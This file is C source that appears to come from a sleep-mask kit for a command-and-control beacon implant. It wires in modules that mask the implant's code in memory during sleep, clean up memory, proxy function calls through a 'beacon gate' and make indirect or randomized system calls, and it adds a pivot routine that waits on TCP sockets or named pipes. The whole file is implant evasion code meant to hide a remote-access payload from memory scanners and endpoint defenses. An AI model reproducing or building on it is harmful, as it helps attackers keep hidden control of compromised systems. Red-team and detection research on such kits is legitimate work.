#include "bofdefs.h"
#include "beacon.h"
#include "beacon_gate.h"
#include "sleepmask.h"
#include "common_logger.h"

/* Define prototypes to resolve include file ordering issues */
void mask_text_section(PBEACON_INFO beacon_info);
void unmask_text_section(PBEACON_INFO beacon_info);

/* Include the source code for sleep mask capabilities */
#include "common_mask.c"
#include "memory_cleanup.c"
#include "beacon_gate.c"

/* USE_SYSCALLS information:
 *   Determine which system call method should be included.
 */
#if USE_SYSCALLS
	#ifdef SYSCALLS_embedded
	#include "syscalls_embedded.c"
	#endif

	#ifdef SYSCALLS_indirect
	#include "syscalls_indirect.c"
	#endif

	#ifdef SYSCALLS_indirect_randomized
	#include "syscalls_indirect_randomized.c"
	#endif

	#ifdef SYSCALLS_beacon
	#include "syscalls_beacon.c"
	#endif
#endif
#include "mask_text_section.c"

#if IMPL_CHKSTK_MS || EVASIVE_SLEEP
void ___chkstk_ms() { /* needed to resolve linker errors for bof_extract */ }
#endif

void pivot_sleep(PPIVOT_ARGS args) {
	if (args->action == ACTION_TCP_ACCEPT) {
		/* accept a socket */
		DLOGT("pivot_sleep: accept a socket\n");
		args->out = accept(args->in, NULL, NULL);
	}
	else if (args->action == ACTION_TCP_RECV) {
		/* block until data is available */
		DLOGT("pivot_sleep: block until data is available\n");
		recv(args->in, &(args->out), 1, MSG_PEEK);
	}
	else if (args->action == ACTION_PIPE_WAIT) {
		BOOL fConnected = 0;

		/* wait for a connection to our pipe */
		DLOGT("pivot_sleep: wait for a connection to our pipe\n");
		while (!fConnected) {
			fConnected = ConnectNamedPipe(args->pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
		}
	}
	else if (args->action == ACTION_PIPE_PEEK) {
		DWORD avail;

		/* wait for data to be available on our pipe. */
		DLOGT("pivot_sleep: wait for data to be available on our pipe\n");
		while (TRUE) {
			if (!PeekNamedPipe(args->pipe, NULL, 0, NULL, &avail, NULL))
				break;

			if (avail > 0)
				break;
			Sleep(10);
		}
	}
}

void sleep_mask_wrapper(PSLEEPMASK_INFO sleepMaskInfo) {

	mask_beacon(sleepMaskInfo);

	/* Determine what to do based on the sleep mask type */
	/* Note: sleepMaskInfo->reason == DEFAULT_SLEEP is implemented in sleepmask.c */
	if (sleepMaskInfo->reason == PIVOT_SLEEP && sleepMaskInfo->pivot_args.action != ACTION_UNKNOWN) {
		DLOGT("sleep_mask: pivot sleep\n");
		pivot_sleep(&sleepMaskInfo->pivot_args);
	}
	else {
		DLOG("sleep_mask: error for sleep mask type: %lu\n", sleepMaskInfo->reason);
	}

	unmask_beacon(sleepMaskInfo);
}

/* do not change the sleep_mask function parameters */
void sleep_mask(PSLEEPMASK_INFO sleepMaskInfo, PFUNCTION_CALL functionCall) {
	DLOGT("**** sleep_mask function start  ****\n");

	/* Perform one-time setup for masking text section with system calls */
	setup_text_section(sleepMaskInfo);

	/* Determine what to do based on the sleep mask type */
	/* Note: sleepMaskInfo->reason == DEFAULT_SLEEP is implemented in sleepmask.c */
	if (sleepMaskInfo->reason == PIVOT_SLEEP) {
		sleep_mask_wrapper(sleepMaskInfo);
	}
	else if (sleepMaskInfo->reason == BEACON_GATE && functionCall != NULL) {
		beacon_gate_wrapper(sleepMaskInfo, functionCall);
	}
	else {
		DLOG("sleep_mask: error for sleep mask type: %lu\n", sleepMaskInfo->reason);
	}

	DLOGT("**** sleep_mask function end  ****\n");
}
